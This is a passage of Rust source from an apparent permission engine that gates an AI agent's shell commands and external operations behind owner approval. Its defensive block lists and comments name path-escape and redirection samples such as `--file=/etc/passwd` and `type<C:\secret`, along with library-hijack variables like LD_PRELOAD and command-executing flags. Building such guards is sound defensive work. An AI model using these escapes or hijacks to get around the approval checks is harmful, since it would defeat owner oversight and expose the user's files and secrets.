                        scope: grant.scope.clone(),
                    },
                };
            }
        }

        // 5b. Local workspace shell execution & compound-command guard (`A-CORE-1`):
        //     Only applies when the project has a bound workspace and write policy permits whole-workspace
        //     dev work (`AllowWorkspace` or default `AskBeforeWrite`) — never bypassing `DenyAll` or
        //     narrow `AllowPaths` prefix sandboxes or delegated parent ceilings!
        if is_execute
            && self.ctx.project_id.is_some()
            && self.ctx.workspace_bound
            && self.ctx.project_lifecycle_state == ProjectLifecycleState::Active
            && matches!(
                self.ctx.workspace_write_policy,
                WorkspaceWritePolicy::AllowWorkspace | WorkspaceWritePolicy::AskBeforeWrite
            )
            && !matches!(
                self.ctx.parent_write_ceiling,
                Some(WorkspaceWritePolicy::DenyAll | WorkspaceWritePolicy::AllowPaths { .. })
            )
        {
            let cmd = extract_shell_command(req);
            if self.ctx.autonomy_mode == AutonomyMode::FullAccess {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    matched_rule_id: None,
                    reason: format!(
                        "allowed workspace shell command under autonomy_mode=full_access (cwd={})",
                        self.ctx.workspace_root.display()
                    ),
                    scope: self.primary_scope_label(),
                });
            }
            match classify_workspace_shell_command(&cmd, &self.ctx.workspace_root) {
                ShellCommandClass::SafeLocal => {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: format!(
                            "allowed safe local workspace shell command under autonomy_mode=auto (cwd={})",
                            self.ctx.workspace_root.display()
                        ),
                        scope: self.primary_scope_label(),
                    });
                }
                ShellCommandClass::RequiresAsk(why) => {
                    let cmd_summary = if cmd.trim().is_empty() {
                        req.tool_name.clone()
                    } else {
                        cmd.trim().to_owned()
                    };
                    return PolicyEvaluationDecision::NeedsInteractiveApproval {
                        normalized_targets: Vec::new(),
                        target_summary: cmd_summary.clone(),
                        scope: self.primary_scope_label(),
                        reason: format!(
                            "shell command requires owner approval ({why}): `{cmd_summary}` (cwd={})",
                            self.ctx.workspace_root.display()
                        ),
                    };
                }
            }
        }

        // 5c. Critical E3/E4 external operations (external effects, messaging, email, payments):
        //     `FullAccess` auto-allows (Step 2 explicit Deny rules already enforced); `Auto`
        //     requests interactive owner approval via InboxCard (with approve_once/session/project).
        if !is_execute
            && !is_file_write
            && !is_file_read
            && is_external_e3_e4_op(&tool_lower, &req.tool_kind)
        {
            if self.ctx.autonomy_mode == AutonomyMode::FullAccess {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    matched_rule_id: None,
                    reason: format!(
                        "allowed external operation `{}` under autonomy_mode=full_access",
                        req.tool_name
                    ),
                    scope: self.primary_scope_label(),
                });
            }
            let target_summary = req
                .target
                .as_deref()
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .unwrap_or(&req.tool_name)
                .to_owned();
            return PolicyEvaluationDecision::NeedsInteractiveApproval {
                normalized_targets: Vec::new(),
                target_summary: target_summary.clone(),
                scope: self.primary_scope_label(),
                reason: format!(
                    "critical external operation `{}` requires owner approval under autonomy_mode=auto (target: {target_summary})",
                    req.tool_name
                ),
            };
        }

        // 6. Read-only file inspection strictly inside the project workspace root
        //    (all targets already verified non-empty & in-workspace in Step 1, and Deny-checked in Step 2).
        if is_file_read {
            let joined_rel = normalized_rel_targets.join(", ");
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!("allowed read-only workspace inspection of `{joined_rel}`"),
                scope: self.primary_scope_label(),
            });
        }

        // 7. Default-DENY for unknown or dangerous tools (shell under DenyAll, unregistered MCP, unknown).
        PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
            effect: PolicyEffect::Deny,
            matched_rule_id: None,
            reason: format!(
                "default-deny outside model: tool `{}` has no matching allow rule",
                req.tool_name
            ),
            scope: format!("session:{}", self.ctx.session_id),
        })
    }

    fn primary_scope_label(&self) -> String {
        self.ctx.project_id.map_or_else(
            || format!("session:{}", self.ctx.session_id),
            |pid| format!("project:{pid}"),
        )
    }

    fn find_matching_grant<'a>(
        &self,
        grants: &'a [CapabilityGrantRecord],
        now: TimestampMs,
        query: GrantMatchQuery<'_>,
    ) -> Option<&'a CapabilityGrantRecord> {
        let owning_project_id = self
            .ctx
            .project_id
            .unwrap_or_else(standalone_system_project_id);
        grants.iter().find(|grant| {
            if !grant.is_active_at(now) {
                return false;
            }
            if grant.project_id != owning_project_id {
                return false;
            }
            // Standalone grants MUST always be explicitly pinned to this exact session_id!
            if self.ctx.project_id.is_none() && grant.session_id != Some(self.ctx.session_id) {
                return false;
            }
            if grant.agent_id.is_some_and(|a| a != self.ctx.agent_id) {
                return false;
            }
            if grant.session_id.is_some_and(|s| s != self.ctx.session_id) {
                return false;
            }
            if grant.task_id.is_some_and(|t| Some(t) != self.ctx.task_id) {
                return false;
            }
            if !grant_matches_tool(&grant.tool_pattern, query.tool_lower, query.is_file_write) {
                return false;
            }
            if grant.target_prefixes.is_empty() {
                return !query.require_non_empty_prefixes;
            }
            if query.is_execute {
                let Some(sig) = query.shell_signature.filter(|s| !s.is_empty()) else {
                    return false;
                };
                return grant
                    .target_prefixes
                    .iter()
                    .any(|allowed| allowed.trim().eq_ignore_ascii_case(sig));
            }
            !query.normalized_rel_targets.is_empty()
                && query
                    .normalized_rel_targets
                    .iter()
                    .all(|rel| matches_any_prefix(rel, &grant.target_prefixes))
        })
    }

    fn active_scopes(&self) -> Vec<String> {
        let mut scopes = Vec::with_capacity(4);
        scopes.push(format!("session:{}", self.ctx.session_id));
        scopes.push(format!("agent:{}", self.ctx.agent_id));
        if let Some(pid) = self.ctx.project_id {
            scopes.push(format!("project:{pid}"));
        }
        scopes.push(String::from("global"));
        scopes
    }
}

#[derive(Clone, Copy)]
struct GrantMatchQuery<'a> {
    tool_lower: &'a str,
    is_file_write: bool,
    is_execute: bool,
    shell_signature: Option<&'a str>,
    normalized_rel_targets: &'a [String],
    require_non_empty_prefixes: bool,
}

/// Returns `true` when `pattern` permits `tool_lower` without escalating write grants to shell tools.
#[must_use]
pub fn grant_matches_tool(pattern: &str, tool_lower: &str, is_file_write: bool) -> bool {
    let norm = pattern.trim().to_ascii_lowercase();
    if norm == "workspace_write" {
        return is_file_write;
    }
    if let Some(prefix) = norm.strip_suffix('*') {
        !prefix.is_empty() && tool_lower.starts_with(prefix)
    } else {
        tool_lower == norm
    }
}

/// Returns `true` when `tool_name` / `tool_kind` classifies as a workspace file-mutating tool.
#[must_use]
pub fn is_workspace_write_tool(tool_name: &str, tool_kind: &str) -> bool {
    is_write_tool(&tool_name.trim().to_ascii_lowercase(), tool_kind)
}

/// Returns `true` when `tool_name` / `tool_kind` classifies as a shell command execution tool.
#[must_use]
pub fn is_shell_execute_tool(tool_name: &str, tool_kind: &str) -> bool {
    is_execute_tool(
        &tool_name.trim().to_ascii_lowercase(),
        tool_kind,
        &serde_json::Value::Null,
    )
}

/// Returns `true` when normalized workspace-relative `rel_path` targets `.git` or any path under `.git/**`
/// (case-insensitive segment check).
#[must_use]
pub fn is_git_metadata_path(rel_path: &str) -> bool {
    rel_path
        .replace('\\', "/")
        .split('/')
        .any(|seg| seg.eq_ignore_ascii_case(".git"))
}

fn targets_git_metadata(normalized_rel_targets: &[String]) -> Option<&str> {
    normalized_rel_targets
        .iter()
        .map(String::as_str)
        .find(|rel| is_git_metadata_path(rel))
}

/// Recording [`PolicyEvaluator`] adapter used during a single Head turn so every external
/// policy check is captured into durable [`PermissionDecisionRecord`] entries.
pub struct RecordingPolicyEvaluator {
    engine: PolicyEngine,
    correlation_id: CorrelationId,
    secrets_to_redact: Vec<String>,
    decisions: Arc<Mutex<Vec<PermissionDecisionRecord>>>,
}

impl RecordingPolicyEvaluator {
    /// Creates a new recording evaluator sharing a decision buffer with the caller.
    #[must_use]
    pub fn new(
        engine: PolicyEngine,
        correlation_id: CorrelationId,
        secrets_to_redact: Vec<String>,
    ) -> (Self, Arc<Mutex<Vec<PermissionDecisionRecord>>>) {
        let decisions = Arc::new(Mutex::new(Vec::new()));
        let eval = Self {
            engine,
            correlation_id,
            secrets_to_redact,
            decisions: Arc::clone(&decisions),
        };
        (eval, decisions)
    }
}

impl PolicyEvaluator for RecordingPolicyEvaluator {
    fn evaluate<'a>(
        &'a self,
        req: &'a PolicyEvaluationRequest,
    ) -> BoxFuture<'a, PolicyEvaluationOutcome> {
        Box::pin(async move {
            let outcome = self.engine.evaluate_request(req);
            let extra: Vec<&str> = self.secrets_to_redact.iter().map(String::as_str).collect();
            let safe_target = req.target.as_deref().map(|t| redact_secrets(t, &extra));
            let safe_reason = redact_secrets(&outcome.reason, &extra);

            let record = PermissionDecisionRecord {
                decision_id: PermissionDecisionId::new(),
                session_id: req.session_id,
                run_id: Some(req.run_id),
                tool_call_id: req.tool_call_id.clone(),
                tool_name: req.tool_name.clone(),
                target_pattern: safe_target,
                scope: outcome.scope.clone(),
                effect: outcome.effect,
                matched_rule_id: outcome.matched_rule_id,
                reason: safe_reason,
                evaluated_outside_model: true,
                correlation_id: self.correlation_id.clone(),
                created_at: TimestampMs::now(),
            };
            if let Ok(mut guard) = self.decisions.lock() {
                guard.push(record);
            }
            outcome
        })
    }
}

const SHELL_INPUT_KEYS: &[&str] = &["CommandLine", "command", "cmd", "script", "shell"];
const FILE_TARGET_INPUT_KEYS: &[&str] = &[
    "Path",
    "path",
    "TargetFile",
    "AbsolutePath",
    "file_path",
    "DirectoryPath",
    "SearchDirectory",
    "SearchPath",
    "Uri",
    "uri",
];
const MEMORY_MCP_OPS: [&str; 15] = [
    "memory_search",
    "memory_get_current",
    "memory_get_history",
    "memory_write_note",
    "memory_correct_note",
    "memory_claim_create",
    "memory_claim_lookup",
    "memory_claim_supersede",
    "memory_conflict_list",
    "memory_conflict_resolve",
    "memory_document_read",
    "memory_document_write",
    "memory_evidence_create",
    "memory_evidence_list",
    "memory_index_status",
];
const CONTROL_MCP_OPS: [&str; 11] = [
    "dennett_event_create",
    "dennett_event_list",
    "dennett_event_update",
    "dennett_event_cancel",
    "dennett_agent_list",
    "dennett_agent_send_message",
    "dennett_agent_list_messages",
    "dennett_artifact_register",
    "dennett_artifact_list",
    "dennett_task_send_signal",
    "dennett_delegate_task",
];
const CONTROL_MCP_SKILL_OPS: [&str; 2] = ["dennett_skill_list", "dennett_skill_read"];
const NATIVE_SUBAGENT_OPS: [&str; 5] = [
    "invoke_subagent",
    "define_subagent",
    "swarm",
    "post_message",
    "read_board",
];
const BUILTIN_WEB_TOOLS: [&str; 6] = [
    "web_search",
    "search_web",
    "web_fetch",
    "fetch_url",
    "google_search",
    "read_url_content",
];

/// Safe local dev/build/test command basenames allowed without prompting in `AutonomyMode::Auto`
/// strictly inside a bound project workspace (`A-CORE-1`).
const SAFE_LOCAL_SHELL_COMMANDS: &[&str] = &[
    "cargo", "rustc", "rustfmt", "npm", "pnpm", "yarn", "node", "uv", "python", "python3",
    "pytest", "rg", "fd", "ls", "dir", "cat", "type", "head", "tail", "find", "grep", "wc", "sort",
    "echo", "pwd", "mkdir", "cp", "mv", "tsc", "vitest", "eslint", "prettier", "go", "dotnet",
];

/// Safe local `git` subcommands allowed without prompting in `AutonomyMode::Auto`.
const SAFE_LOCAL_GIT_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "add",
    "commit",
    "branch",
    "checkout",
    "switch",
    "rev-parse",
    "stash",
    "tag",
    "blame",
    "ls-files",
    "grep",
    "merge-base",
    "describe",
    "shortlog",
];

#[derive(Debug, Clone, PartialEq, Eq)]
enum ShellCommandClass {
    SafeLocal,
    RequiresAsk(String),
}

fn is_builtin_web_tool(tool_lower: &str, tool_kind: &str, raw_input: &serde_json::Value) -> bool {
    if is_execute_tool(tool_lower, tool_kind, raw_input)
        || is_write_tool(tool_lower, tool_kind)
        || has_any_json_key(raw_input, FILE_TARGET_INPUT_KEYS)
    {
        return false;
    }
    BUILTIN_WEB_TOOLS.contains(&tool_lower)
}

fn is_mutating_or_external_mcp_tool(tool_lower: &str, tool_kind: &str) -> bool {
    let kind_lower = tool_kind.trim().to_ascii_lowercase();
    if matches!(
        kind_lower.as_str(),
        "edit" | "delete" | "move" | "execute" | "external_effect"
    ) {
        return true;
    }
    // Extract trailing operation token after server separator (`__`, `:`, `/`, `.`) if present.
    let op_part = tool_lower
        .rsplit_once("__")
        .or_else(|| tool_lower.rsplit_once(':'))
        .or_else(|| tool_lower.rsplit_once('/'))
        .map_or(tool_lower, |(_, tail)| tail);
    let tokens: Vec<&str> = op_part
        .split(['_', '-', '.'])
        .filter(|s| !s.is_empty())
        .collect();
    let mutating_keywords = [
        "send", "post", "publish", "pay", "payment", "charge", "transfer", "purchase", "buy",
        "delete", "remove", "drop", "destroy", "create", "update", "write", "edit", "modify",
        "patch", "put", "email", "mail", "message", "dm", "tweet", "webhook", "dispatch",
        "execute", "exec", "run", "deploy", "merge", "push", "invite", "grant", "revoke",
    ];
    tokens.iter().any(|tok| mutating_keywords.contains(tok))
}

fn is_external_e3_e4_op(tool_lower: &str, tool_kind: &str) -> bool {
    if tool_kind.eq_ignore_ascii_case("external_effect")
        || tool_lower.starts_with("external_effect:")
    {
        return true;
    }
    matches!(
        tool_lower,
        "send_email"
            | "send_message"
            | "send_sms"
            | "send_payment"
            | "create_payment"
            | "charge_card"
            | "transfer_funds"
            | "post_webhook"
            | "publish_post"
            | "send_telegram"
            | "send_slack"
    )
}

fn extract_shell_command(req: &PolicyEvaluationRequest) -> String {
    if let Some(obj) = req.raw_input.as_object() {
        for key in SHELL_INPUT_KEYS {
            if let Some(val) = obj
                .get(*key)
                .and_then(serde_json::Value::as_str)
                .map(str::trim)
                .filter(|s| !s.is_empty())
            {
                return val.to_owned();
            }
        }
    }
    req.target
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or_default()
        .to_owned()
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ShellToken {
    text: String,
    has_unquoted_redir: bool,
}

fn contains_subshell_or_escape_syntax(cmd: &str, is_windows: bool) -> Option<&'static str> {
    if cmd.contains('\0') {
        return Some("NUL byte in shell command");
    }
    // Reject environment-variable and home-directory expansions (`$`, `%`, `~`) unconditionally
    // across platforms (cmd.exe expands `%VAR%` even inside double quotes; POSIX/PowerShell
    // expand `$VAR` inside double quotes; `~` escapes workspace to user home).
    if cmd.contains('$') || cmd.contains('%') || cmd.contains('~') {
        return Some("environment variable or home expansion (`$`/`%`/`~`)");
    }
    if is_windows && (cmd.contains('^') || cmd.contains('!')) {
        return Some("Windows shell escape or delayed expansion (`^`/`!`)");
    }

    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    for c in cmd.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if !is_windows && c == '\\' && !in_single {
            escaped = true;
            continue;
        }
        if !is_windows && c == '\'' && !in_double {
            in_single = !in_single;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            continue;
        }
        if !in_single && c == '`' {
            return Some("backtick command substitution");
        }
        if !in_single && !in_double && (c == '(' || c == ')') {
            return Some("parenthesized subexpression");
        }
    }
    None
}

fn split_shell_segments(cmd: &str, is_windows: bool) -> Result<Vec<String>, String> {
    let mut segments = Vec::new();
    let mut cur = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if escaped {
            cur.push(c);
            escaped = false;
            i += 1;
            continue;
        }
        if !is_windows && c == '\\' && !in_single {
            cur.push(c);
            escaped = true;
            i += 1;
            continue;
        }
        if !is_windows && c == '\'' && !in_double {
            in_single = !in_single;
            cur.push(c);
            i += 1;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            cur.push(c);
            i += 1;
            continue;
        }
        if !in_single && !in_double {
            if c == ';' || c == '\n' || c == '\r' {
                let trimmed = cur.trim();
                if !trimmed.is_empty() {
                    segments.push(trimmed.to_owned());
                }
                cur.clear();
                i += 1;
                continue;
            }
            if c == '&' {
                // Allow fd duplication like `2>&1` inside a segment.
                if i > 0 && chars[i - 1] == '>' {
                    cur.push(c);
                    i += 1;
                    continue;
                }
                if i + 1 < chars.len() && chars[i + 1] == '&' {
                    let trimmed = cur.trim();
                    if !trimmed.is_empty() {
                        segments.push(trimmed.to_owned());
                    }
                    cur.clear();
                    i += 2;
                    continue;
                }
                return Err(String::from("background `&` operator"));
            }
            if c == '|' {
                let trimmed = cur.trim();
                if !trimmed.is_empty() {
                    segments.push(trimmed.to_owned());
                }
                cur.clear();
                if i + 1 < chars.len() && chars[i + 1] == '|' {
                    i += 2;
                } else {
                    i += 1;
                }
                continue;
            }
        }
        cur.push(c);
        i += 1;
    }
    if in_single || in_double {
        return Err(String::from("unterminated shell quote"));
    }
    let trimmed = cur.trim();
    if !trimmed.is_empty() {
        segments.push(trimmed.to_owned());
    }
    Ok(segments)
}

fn tokenize_shell_segment(seg: &str, is_windows: bool) -> Vec<ShellToken> {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut has_unquoted_redir = false;
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    for c in seg.chars() {
        if escaped {
            cur.push(c);
            escaped = false;
            continue;
        }
        if !is_windows && c == '\\' && !in_single {
            escaped = true;
            continue;
        }
        if !is_windows && c == '\'' && !in_double {
            in_single = !in_single;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            continue;
        }
        if !in_single && !in_double {
            if c.is_whitespace() {
                if !cur.is_empty() {
                    tokens.push(ShellToken {
                        text: std::mem::take(&mut cur),
                        has_unquoted_redir,
                    });
                    has_unquoted_redir = false;
                }
                continue;
            }
            if c == '<' || c == '>' {
                has_unquoted_redir = true;
            }
        }
        cur.push(c);
    }
    if !cur.is_empty() {
        tokens.push(ShellToken {
            text: cur,
            has_unquoted_redir,
        });
    }
    tokens
}

fn is_harmless_shell_redir(tok: &str) -> bool {
    tok == "2>&1"
        || tok == "1>&2"
        || tok.eq_ignore_ascii_case(">/dev/null")
        || tok.eq_ignore_ascii_case("1>/dev/null")
        || tok.eq_ignore_ascii_case("2>/dev/null")
        || tok.eq_ignore_ascii_case(">nul")
        || tok.eq_ignore_ascii_case("1>nul")
        || tok.eq_ignore_ascii_case("2>nul")
}

fn is_null_sink_path(tok: &str) -> bool {
    tok.eq_ignore_ascii_case("/dev/null") || tok.eq_ignore_ascii_case("nul")
}

fn is_env_assignment_token(tok: &str) -> Option<&str> {
    let (name, _val) = tok.split_once('=')?;
    if !name.is_empty()
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
        && !name.as_bytes()[0].is_ascii_digit()
    {
        Some(name)
    } else {
        None
    }
}

fn is_dangerous_git_global_option(arg: &str) -> bool {
    let lower = arg.to_ascii_lowercase();
    arg == "-c"
        || arg.starts_with("-c")
        || arg == "-C"
        || arg.starts_with("-C")
        || lower == "--config-env"
        || lower.starts_with("--config-env=")
        || lower == "--exec-path"
        || lower.starts_with("--exec-path=")
        || lower == "--git-dir"
        || lower.starts_with("--git-dir=")
        || lower == "--work-tree"
        || lower.starts_with("--work-tree=")
}

fn is_dangerous_git_long_option(arg: &str) -> bool {
    let lower = arg.to_ascii_lowercase();
    lower == "--config-env"
        || lower.starts_with("--config-env=")
        || lower == "--exec-path"
        || lower.starts_with("--exec-path=")
        || lower == "--git-dir"
        || lower.starts_with("--git-dir=")
        || lower == "--work-tree"
        || lower.starts_with("--work-tree=")
}

fn is_python_inline_eval_flag(arg: &str) -> bool {
    arg == "-"
        || arg == "-c"
        || arg.starts_with("-c")
        || (arg.starts_with('-') && !arg.starts_with("--") && arg.contains('c'))
}

fn is_node_inline_eval_flag(arg: &str) -> bool {
    let lower = arg.to_ascii_lowercase();
    arg == "-e"
        || arg == "-p"
        || arg.starts_with("-e")
        || arg.starts_with("-p")
        || lower == "--eval"
        || lower.starts_with("--eval=")
        || lower == "--print"
        || lower.starts_with("--print=")
        || (arg.starts_with('-')
            && !arg.starts_with("--")
            && (arg.contains('e') || arg.contains('p')))
}

fn validate_shell_arg_within_workspace(arg: &str, workspace_root: &Path) -> Result<(), String> {
    let trimmed = arg.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    if trimmed.contains('$') || trimmed.contains('%') || trimmed.contains('~') {
        return Err(format!(
            "argument `{trimmed}` contains environment or home expansion"
        ));
    }
    if trimmed.starts_with('\\') {
        return Err(format!(
            "Windows drive-root or UNC path `{trimmed}` escapes workspace"
        ));
    }

    // Reject path traversal (`..`) or home (`~`) escapes in any path-like argument.
    let norm = trimmed.replace('\\', "/");
    if norm == ".."
        || norm.starts_with("../")
        || norm.ends_with("/..")
        || norm.contains("/../")
        || norm == "~"
        || norm.starts_with("~/")
        || norm.starts_with("//")
    {
        return Err(format!("argument `{trimmed}` traverses outside workspace"));
    }

    // Reject absolute paths (POSIX `/...` or Windows `C:/...` or `C:\...` or `C:foo`) pointing outside workspace!
    let looks_windows_abs = trimmed.len() >= 2
        && trimmed.as_bytes()[0].is_ascii_alphabetic()
        && trimmed.as_bytes()[1] == b':';
    let looks_posix_abs = trimmed.starts_with('/') && !trimmed.eq_ignore_ascii_case("/dev/null");
    if (looks_windows_abs || looks_posix_abs)
        && resolve_within_workspace(workspace_root, trimmed).is_err()
    {
        return Err(format!("absolute path `{trimmed}` escapes workspace"));
    }

    // Also inspect the right-hand side of `--flag=value` options so `--file=/etc/passwd` or
    // `--out=..\escape` cannot smuggle outside paths past flag prefixes.
    if trimmed.starts_with('-')
        && let Some((_, rhs)) = trimmed.split_once('=')
        && !rhs.is_empty()
    {
        validate_shell_arg_within_workspace(rhs, workspace_root)?;
    }

    Ok(())
}

fn classify_workspace_shell_command(cmd: &str, workspace_root: &Path) -> ShellCommandClass {
    classify_workspace_shell_command_for_platform(cmd, workspace_root, cfg!(windows))
}

#[expect(
    clippy::too_many_lines,
    reason = "shell command classification audits compound segments, redirections, allowlist, and subcommand rules in one place"
)]
fn classify_workspace_shell_command_for_platform(
    cmd: &str,
    workspace_root: &Path,
    is_windows: bool,
) -> ShellCommandClass {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return ShellCommandClass::RequiresAsk(String::from("empty command"));
    }
    if let Some(why) = contains_subshell_or_escape_syntax(trimmed, is_windows) {
        return ShellCommandClass::RequiresAsk(why.to_owned());
    }
    let segments = match split_shell_segments(trimmed, is_windows) {
        Ok(s) if !s.is_empty() => s,
        Ok(_) => return ShellCommandClass::RequiresAsk(String::from("empty command")),
        Err(why) => return ShellCommandClass::RequiresAsk(why),
    };

    for seg in &segments {
        let tokens = tokenize_shell_segment(seg, is_windows);
        if tokens.is_empty() {
            return ShellCommandClass::RequiresAsk(String::from("empty command segment"));
        }

        // Vector (d): Reject ANY unquoted token containing `<` or `>` anywhere inside it
        // (including attached forms like `echo evil>C:\x.bat`, `echo x>..\out`, `type<C:\secret`),
        // permitting ONLY exact harmless fd-dup / null-sink redirections!
        let mut clean_tokens: Vec<&str> = Vec::with_capacity(tokens.len());
        let mut ti = 0;
        while ti < tokens.len() {
            let tok = &tokens[ti];
            if tok.has_unquoted_redir {
                if is_harmless_shell_redir(&tok.text) {
                    ti += 1;
                    continue;
                }
                if matches!(tok.text.as_str(), ">" | "1>" | "2>")
                    && let Some(next) = tokens.get(ti + 1)
                    && !next.has_unquoted_redir
                    && is_null_sink_path(&next.text)
                {
                    ti += 2;
                    continue;
                }
                return ShellCommandClass::RequiresAsk(format!(
                    "shell redirection `{}` requires owner approval",
                    tok.text
                ));
            }
            clean_tokens.push(&tok.text);
            ti += 1;
        }
        if clean_tokens.is_empty() {
            return ShellCommandClass::RequiresAsk(String::from("empty command segment"));
        }

        // Skip safe leading `VAR=val` env assignments; reject linker/PATH/git hijacks.
        let mut idx = 0;
        while idx < clean_tokens.len()
            && let Some(var_name) = is_env_assignment_token(clean_tokens[idx])
        {
            let upper = var_name.to_ascii_uppercase();
            if matches!(
                upper.as_str(),
                "PATH"
                    | "LD_PRELOAD"
                    | "LD_LIBRARY_PATH"
                    | "DYLD_INSERT_LIBRARIES"
                    | "PYTHONPATH"
                    | "NODE_OPTIONS"
                    | "RUSTFLAGS"
                    | "RUSTC_WRAPPER"
                    | "GIT_EXEC_PATH"
                    | "GIT_DIR"
                    | "GIT_WORK_TREE"
                    | "GIT_SSH_COMMAND"
                    | "GIT_CONFIG_GLOBAL"
                    | "GIT_CONFIG_PARAMETERS"
            ) || upper.starts_with("GIT_CONFIG_")
            {
                return ShellCommandClass::RequiresAsk(format!(
                    "sensitive env override `{var_name}`"
                ));
            }
            idx += 1;
        }
        if idx >= clean_tokens.len() {
            return ShellCommandClass::RequiresAsk(String::from("assignment without command"));
        }

        let raw_exe = clean_tokens[idx];
        let args = &clean_tokens[idx + 1..];

        // Reject path-qualified executables pointing outside workspace or containing separators.
        if raw_exe.contains('/') || raw_exe.contains('\\') || raw_exe.contains(':') {
            return ShellCommandClass::RequiresAsk(format!(
                "path-qualified executable `{raw_exe}`"
            ));
        }

        let exe_lower = raw_exe.to_ascii_lowercase();
        let exe_base = exe_lower
            .strip_suffix(".exe")
            .or_else(|| exe_lower.strip_suffix(".cmd"))
            .or_else(|| exe_lower.strip_suffix(".bat"))
            .unwrap_or(&exe_lower);

        // Validate every argument against workspace boundaries!
        for arg in args {
            if let Err(why) = validate_shell_arg_within_workspace(arg, workspace_root) {
                return ShellCommandClass::RequiresAsk(why);
            }
        }

        // Special-case `git`: reject config/hook/dir-override flags and allow ONLY safe local subcommands!
        if exe_base == "git" {
            for a in args {
                if is_dangerous_git_long_option(a) {
                    return ShellCommandClass::RequiresAsk(format!(
                        "git option `{a}` can alter repository config, hooks, or execution path"
                    ));
                }
            }
            let mut sub_idx = 0;
            while sub_idx < args.len() {
                let a = args[sub_idx];
                if is_dangerous_git_global_option(a) {
                    return ShellCommandClass::RequiresAsk(format!(
                        "git option `{a}` can alter repository config, hooks, or execution path"
                    ));
                }
                if a.starts_with('-') {
                    sub_idx += 1;
                    continue;
                }
                break;
            }
            let Some(subcmd) = args.get(sub_idx).map(|s| s.to_ascii_lowercase()) else {
                return ShellCommandClass::RequiresAsk(String::from("git without subcommand"));
            };
            if !SAFE_LOCAL_GIT_SUBCOMMANDS.contains(&subcmd.as_str()) {
                return ShellCommandClass::RequiresAsk(format!(
                    "git subcommand `{subcmd}` may perform network or destructive operation"
                ));
            }
            continue;
        }

        if !SAFE_LOCAL_SHELL_COMMANDS.contains(&exe_base) {
            return ShellCommandClass::RequiresAsk(format!(
                "command `{raw_exe}` is outside safe local workspace allowlist"
            ));
        }

        // Defense-in-depth: prevent silent `.git/**` mutation via `cp`/`mv`/`mkdir`.
        if matches!(exe_base, "cp" | "mv" | "mkdir")
            && let Some(git_arg) = args.iter().find(|a| is_git_metadata_path(a))
        {
            return ShellCommandClass::RequiresAsk(format!(
                "{exe_base} targeting Git metadata `{git_arg}` requires owner approval"
            ));
        }

        if exe_base == "find"
            && let Some(bad) = args.iter().find(|a| {
                matches!(
                    a.to_ascii_lowercase().as_str(),
                    "-exec"
                        | "-execdir"
                        | "-ok"
                        | "-okdir"
                        | "-delete"
                        | "-fprint"
                        | "-fprintf"
                        | "-fls"
                        | "-fprint0"
                )
            })
        {
            return ShellCommandClass::RequiresAsk(format!(
                "find flag `{bad}` executes commands or modifies files"
            ));
        }

        if exe_base == "fd"
            && let Some(bad) = args.iter().find(|a| {
                let lower = a.to_ascii_lowercase();
                matches!(lower.as_str(), "-x" | "--exec" | "--exec-batch")
                    || **a == "-X"
                    || lower.starts_with("--exec=")
                    || lower.starts_with("--exec-batch=")
            })
        {
            return ShellCommandClass::RequiresAsk(format!(
                "fd flag `{bad}` executes arbitrary commands"
            ));
        }

        // Guard network-fetching / global-mutation subcommands on allowlisted toolchains.
        if exe_base == "cargo" {
            if args.iter().any(|a| *a == "-C" || a.starts_with("-C")) {
                return ShellCommandClass::RequiresAsk(String::from(
                    "cargo `-C` directory override requires owner approval",
                ));
            }
            if let Some(sub) = args
                .iter()
                .find(|a| !a.starts_with('-') && !a.starts_with('+'))
                && matches!(
                    sub.to_ascii_lowercase().as_str(),
                    "add"
                        | "fetch"
                        | "update"
                        | "install"
                        | "publish"
                        | "login"
                        | "logout"
                        | "owner"
                        | "yank"
                )
            {
                return ShellCommandClass::RequiresAsk(format!(
                    "cargo subcommand `{sub}` accesses remote registry or modifies dependencies"
                ));
            }
        }

        if matches!(exe_base, "npm" | "pnpm" | "yarn") {
            if args.iter().any(|a| {
                let lower = a.to_ascii_lowercase();
                *a == "-C"
                    || a.starts_with("-C")
                    || lower == "--prefix"
                    || lower.starts_with("--prefix=")
                    || lower == "--dir"
                    || lower.starts_with("--dir=")
            }) {
                return ShellCommandClass::RequiresAsk(format!(
                    "{exe_base} directory override flag requires owner approval"
                ));
            }
            if let Some(sub) = args.iter().find(|a| !a.starts_with('-'))
                && matches!(
                    sub.to_ascii_lowercase().as_str(),
                    "install"
                        | "i"
                        | "ci"
                        | "add"
                        | "exec"
                        | "dlx"
                        | "create"
                        | "init"
                        | "publish"
                        | "login"
                        | "adduser"
                        | "unpublish"
                        | "owner"
                        | "token"
                        | "link"
                        | "uninstall"
                )
            {
                return ShellCommandClass::RequiresAsk(format!(
                    "{exe_base} subcommand `{sub}` installs packages or executes remote code"
                ));
            }
        }

        if matches!(exe_base, "python" | "python3")
            && args.iter().any(|a| is_python_inline_eval_flag(a))
        {
            return ShellCommandClass::RequiresAsk(format!(
                "inline `{exe_base}` script evaluation requires owner approval"
            ));
        }

